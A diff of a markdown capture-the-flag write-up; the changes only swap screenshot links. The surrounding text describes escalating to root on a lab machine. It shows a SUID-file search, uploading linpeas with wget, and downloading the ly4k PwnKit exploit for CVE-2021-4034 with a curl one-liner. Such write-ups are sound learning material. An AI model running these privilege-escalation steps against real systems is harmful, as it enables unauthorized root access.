@@ -81,7 +81,8 @@ Now that I am in the server, I ran the following to check for bad permissions:
 "find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null"
 Nothing much, next I uploaded linpeas to do all the heavy lifting for me using wget and a simple python http server:
   
-<img width="952" alt="image" src="https://user-images.githubusercontent.com/66540055/193355463-8d1be9b1-41fa-4e5e-af92-631c8b5109ea.png">
+<img width="952" alt="image" src="https://user-images.githubusercontent.com/66540055/193360637-85ef9194-e8df-4b90-9c34-8e66d07e1f3e.png">
+
 
 After making the script executable and running it I saw that this machine is vulnerableto CVE-2021-4034:
   
@@ -91,8 +92,9 @@ After doing some Google searching I found a really useful toolkit created by Ly4
 Using this oneliner the toolkit is downloaded "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit"
 I uploaded the toolkit using the same method as uploading linpeas, made it executable and upon executing it I got root!
   
-<img width="944" alt="image" src="https://user-images.githubusercontent.com/66540055/193356867-2b911fdf-7c11-4a6f-aa3c-c70af59059ea.png">
+<img width="944" alt="image" src="https://user-images.githubusercontent.com/66540055/193360751-f1602269-9178-42f4-856d-2bf43c4c252e.png">
 
+  
 # Root flag
 Moving to the root directory I found the final flag!
   
